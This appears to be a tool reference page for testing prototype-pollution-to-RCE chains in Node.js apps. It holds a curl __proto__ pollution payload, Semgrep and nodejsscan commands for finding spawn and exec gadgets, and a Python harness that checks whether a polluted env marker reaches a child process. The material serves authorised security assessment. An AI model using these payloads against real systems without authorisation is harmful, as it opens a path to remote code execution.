# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`prototype-pollution-rce-chains`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -d '{"__proto__":{"env":{"RC_MARKER":"set"}}}' -H 'Content-Type: application/json' 'https://target.example/settings'` | Pollute an inert env default, then exercise a route that spawns a child and reflects its env | Cross-platform |
| `Semgrep` | `semgrep -e 'execFile($B, $A)' -e 'spawn($B, $A)' -l javascript .` | Find spawn and exec call sites that omit an explicit options object | Cross-platform |
| `nodejsscan` | `nodejsscan -d ./app` | Surface template compile and child_process gadgets reachable from request handlers | Cross-platform |

## Minimal Script Shape

A gadget verification harness: it pollutes an inert env marker, then calls a route that spawns a child and reflects its environment, reporting whether the marker crosses into the child, proving the chain without running a command.

```python
import json
import urllib.request

SINK = "https://target.example/settings"
ROUTE = "https://target.example/export-debug"
MARKER = "RC_MARKER"

def post(body):
    data = json.dumps(body).encode()
    req = urllib.request.Request(SINK, data=data, method="POST",
                                headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.status

def exercise():
    req = urllib.request.Request(ROUTE, headers={"User-Agent": "authorised-assessment"})
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.read().decode("utf-8", "replace")

post({"__proto__": {"env": {MARKER: "set"}}})
in_child = MARKER in exercise()
print({"marker": MARKER, "inherited_by_child": in_child,
       "verdict": "rce-gadget-reachable" if in_child else "no-gadget-path"})
```
